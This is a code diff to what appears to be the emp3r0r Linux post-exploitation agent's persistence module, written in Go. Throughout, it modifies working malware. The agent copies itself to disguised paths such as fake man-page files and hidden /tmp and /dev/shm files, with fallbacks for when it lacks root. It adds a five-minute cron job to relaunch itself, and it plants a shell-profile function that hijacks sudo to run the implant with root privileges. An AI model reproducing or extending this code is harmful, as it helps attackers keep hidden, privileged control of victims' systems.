@@ -17,8 +17,6 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-// TODO implement more methods
-
 var (
 	// PersistMethods CC calls one of these methods to get persistence, or all of them at once
 	// look at emp3r0r_data.PersistMethods too
@@ -40,7 +38,9 @@ var (
 		"/usr/share/man/man1/arch.gz",
 		"/usr/share/man/man1/ls.1.gz",
 		"/usr/share/man/man1/arch.5.gz",
+	}
 
+	EmpLocationsNoRoot = []string{
 		// no root required
 		"/tmp/.env",
 		"/dev/shm/.env",
@@ -57,12 +57,16 @@ var (
 	}
 
 	// call this to start emp3r0r
-	payload = strings.Join(EmpLocations, " -silent=true -daemon=true || ") + " -silent=true -daemon=true"
+	payload = strings.Join(EmpLocations, " || ")
 )
 
 // SelfCopy copy emp3r0r to multiple locations
 func SelfCopy() {
-	for _, path := range EmpLocations {
+	locations := EmpLocations
+	if !HasRoot() {
+		locations = EmpLocationsNoRoot
+	}
+	for _, path := range locations {
 		err := CopySelfTo(path)
 		if err != nil {
 			log.Print(err)
@@ -72,28 +76,33 @@ func SelfCopy() {
 }
 
 // PersistAllInOne run all persistence method at once
-func PersistAllInOne() (err error) {
+func PersistAllInOne() (final_err error) {
 	for k, method := range PersistMethods {
-		e := fmt.Errorf("%s: %v", k, method())
+		res := "succeeded"
+		method_err := method()
+		if method_err != nil {
+			res = fmt.Sprintf("failed: %v", method_err)
+		}
+		e := fmt.Errorf("%s: %s", k, res)
 		if e != nil {
-			err = fmt.Errorf("%v, %v", err, e)
+			final_err = fmt.Errorf("%v; %v", final_err, e)
 		}
 	}
 	return
 }
 
 func cronJob() (err error) {
-	err = util.Copy(os.Args[0], "bash")
+	locations := EmpLocations
+	if !HasRoot() {
+		locations = EmpLocationsNoRoot
+	}
+	exe_location := locations[util.RandInt(0, len(locations))]
+	err = CopySelfTo(exe_location)
 	if err != nil {
 		return
 	}
 
-	pwd, err := os.Getwd()
-	if err != nil {
-		return
-	}
-	err = AddCronJob("*/5 * * * * " + pwd + "/bash")
-	return
+	return AddCronJob("*/5 * * * * " + exe_location)
 }
 
 func profiles() (err error) {
@@ -134,7 +143,7 @@ func profiles() (err error) {
 	// sudo payload
 	var sudoLocs []string
 	for _, loc := range EmpLocations {
-		sudoLocs = append(sudoLocs, "`which sudo` -E "+loc+" -silent=true -daemon=true")
+		sudoLocs = append(sudoLocs, "`which sudo` -E "+loc)
 	}
 	sudoPayload := strings.Join(sudoLocs, "||")
 	loader += fmt.Sprintf("\nfunction sudo() { `which sudo` $@; (set +m;(%s)) }", sudoPayload)
